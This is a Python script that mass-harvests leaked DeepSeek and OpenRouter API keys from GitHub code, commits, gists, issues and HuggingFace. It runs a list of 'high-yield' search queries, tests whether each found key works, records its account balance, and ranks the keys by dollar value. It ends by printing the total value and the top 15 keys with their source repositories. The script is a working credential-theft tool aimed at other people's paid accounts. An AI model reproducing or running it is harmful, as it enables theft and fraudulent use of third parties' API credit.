#!/usr/bin/env python3
"""
扩展扫描 — 使用新源 + 新模式 + 提交历史扫描
覆盖: GitHub Code Search + Gist + Issues + Commits + HuggingFace + 传统源
"""
import sys, time, os, json
sys.path.insert(0, ".")

from scanner_engine import ScannerEngine, BUILTIN_QUERIES

def log(msg, level="info"):
    prefix = {"warning": "[!] ", "error": "[ERR] "}.get(level, "")
    t = time.strftime("%m-%d %H:%M:%S")
    print(f"[{t}] {prefix}{msg}", flush=True)

# Load existing
EXISTING = {}
existing_file = "results/deepseek_keys_result.json"
if os.path.exists(existing_file):
    with open(existing_file, "r", encoding="utf-8") as f:
        for r in json.load(f):
            EXISTING[r["key"]] = r
    log(f"Loaded {len(EXISTING)} existing keys")

# Phase 1: GitHub Code Search with expanded queries (high-yield first)
HIGH_YIELD_QUERIES = [
    # New high-yield patterns (untapped)
    "OPENROUTER_API_KEY sk-",
    "openrouter deepseek sk-",
    "langchain deepseek api_key",
    "langchain deepseek sk- filename:py",
    "dify deepseek api_key",
    "open-webui deepseek sk-",
    "deepseek sk- filename:README",
    "deepseek sk- path:.github/workflows",
    "DEEPSEEK_API_KEY path:.github/workflows",
    # Existing high-yield (avoid exact duplicates, use time-filtered variants)
    "deepseek sk- filename:java pushed:>2026-04-01",
    "deepseek sk- filename:py pushed:>2026-04-01",
    "deepseek sk- filename:env pushed:>2026-05-01",
    "deepseek sk- filename:js pushed:>2026-04-01",
    "deepseek sk- filename:kt pushed:>2026-04-01",
    "deepseek sk- filename:properties pushed:>2026-04-01",
    "deepseek sk- filename:yml pushed:>2026-04-01",
    "deepseek sk- filename:json pushed:>2026-04-01",
    "deepseek API_KEY sk- language:Java NOT test NOT example",
    "deepseek Authorization sk- language:Python NOT test",
    "deepseek DEEPSEEK_API_KEY sk- language:TypeScript",
    "api.deepseek.com sk- path:src",
    "deepseek Client sk- filename:kt NOT test",
    "deepseek import sk- filename:dart",
    "deepseek OpenAIClient sk- filename:go NOT test",
    "deepseek Authorization Bearer sk- filename:js NOT test",
    "deepseek process.env.DEEPSEEK sk- filename:ts",
    "deepseek sk- path:config",
    "deepseek sk- filename:application.yml",
    "deepseek sk- filename:application.properties",
    "deepseek deepseek_api_key sk- filename:env",
    "deepseek sk- filename:toml path:config",
    "deepseek base_url sk- filename:json",
]

log(f"PHASE 1: GitHub Code Search — {len(HIGH_YIELD_QUERIES)} new queries")
log(f"Start: {time.strftime('%Y-%m-%d %H:%M:%S')}")

engine = ScannerEngine(
    concurrency=20,
    timeout=15,
    search_delay=3.5,
    scan_pages=5,
    max_duration=3600,
    max_valid_keys=0,
    output_dir="./results/.tmp_batch",
    log_callback=log,
)

t0 = time.time()
results = engine.run(HIGH_YIELD_QUERIES)
elapsed = time.time() - t0

for r in results:
    if r["key"] not in EXISTING:
        EXISTING[r["key"]] = r
    else:
        old = EXISTING[r["key"]]
        if r.get("balance_usd", 0) != old.get("balance_usd", 0):
            EXISTING[r["key"]] = r
        else:
            old_repos = {x["repo"] for x in old.get("repos", [])}
            for repo in r.get("repos", []):
                if repo["repo"] not in old_repos:
                    old.setdefault("repos", []).append(repo)

log(f"PHASE 1 done: {elapsed:.0f}s | New+Updated: {len(results)}")

# Phase 2: Multi-source scan with NEW scanners
log(f"")
log(f"{'='*60}")
log(f"PHASE 2: Multi-source scan — HuggingFace + Commits + Gist + Issues + ...")
log(f"{'='*60}")

engine2 = ScannerEngine(
    concurrency=15,
    timeout=15,
    search_delay=2.0,
    scan_pages=3,
    max_duration=3600,
    max_valid_keys=0,
    output_dir="./results/.tmp_batch",
    log_callback=log,
)

# Sources to scan (prioritize NEW ones)
sources = ["huggingface", "commits", "gist", "issues"]
log(f"Sources: {sources}")

multi_results = engine2.run_multi_source(sources)

new_from_multi = 0
for r in multi_results:
    if r["key"] not in EXISTING:
        EXISTING[r["key"]] = r
        new_from_multi += 1
    else:
        old = EXISTING[r["key"]]
        if r.get("balance_usd", 0) != old.get("balance_usd", 0):
            EXISTING[r["key"]] = r
        else:
            old_repos = {x["repo"] for x in old.get("repos", [])}
            for repo in r.get("repos", []):
                if repo["repo"] not in old_repos:
                    old.setdefault("repos", []).append(repo)

log(f"PHASE 2 done: New from multi-source: {new_from_multi}")

# Save final merged results
merged = sorted(EXISTING.values(), key=lambda x: x.get("balance_usd", 0), reverse=True)
with open("results/deepseek_keys_result.json", "w", encoding="utf-8") as f:
    json.dump(merged, f, ensure_ascii=False, indent=2)

valid = [r for r in merged if r.get("valid")]
pos = [r for r in valid if r.get("balance_usd", 0) > 0]
zero = [r for r in valid if r.get("balance_usd", 0) == 0]
neg = [r for r in valid if r.get("balance_usd", 0) < 0]
total_v = sum(r["balance_usd"] for r in pos)

log(f"")
log(f"{'='*60}")
log(f"EXPANDED SCAN COMPLETE")
log(f"Total keys: {len(merged)} | Valid: {len(valid)} | Positive: {len(pos)} | Zero: {len(zero)} | Negative: {len(neg)}")
log(f"TOTAL VALUE: ${total_v:.2f}")
if pos:
    log(f"")
    log(f"Top 15:")
    for i, r in enumerate(pos[:15]):
        src = r["repos"][0]["repo"] if r.get("repos") else "N/A"
        cur = r.get("primary_currency", "USD")
        log(f"  {i+1:2d}. {r['key_preview']} | {cur} {r['balance']:.4f} | ${r['balance_usd']:.2f} | {src[:55]}")
